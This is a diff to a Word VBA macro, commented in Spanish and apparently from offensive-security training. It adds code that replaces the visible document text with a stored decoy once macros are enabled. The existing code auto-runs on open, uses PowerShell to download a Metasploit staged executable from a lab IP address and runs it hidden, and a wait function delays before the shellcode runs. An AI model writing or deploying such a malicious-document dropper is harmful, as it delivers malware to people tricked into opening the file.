@@ -7,6 +7,15 @@ Sub AutoOpen()
 End Sub
 
 Sub MyMacro()
+
+	'En este bloque cambiamos el contenido del doc cuando alloweamos macros y protected view
+	'Cambiar TheDoc por el nombre que pongamos al crear el autoPart
+	ActiveDocument.Content.Select
+	Selection.Delete
+	ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert Where:=Selection.Range, RichText=True
+
+
+	'Y aquí la chicha, atento a las rutas, y el ultimo nombre es el nombre que saldrá en el pc en el que se descarga entonces podría cambiarse.
 	Dim str As String
 	str= "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')"
 	Dim exePath As String
@@ -15,6 +24,7 @@ Sub MyMacro()
 	Shell exePath, vbHide
 End Sub
 
+'Funcion que espera n segundos, la utilizamos para esperar antes de ejecutar el ShellCode
 Sub Wait(n As Long)
 	Dim t As Date
 	t= Now
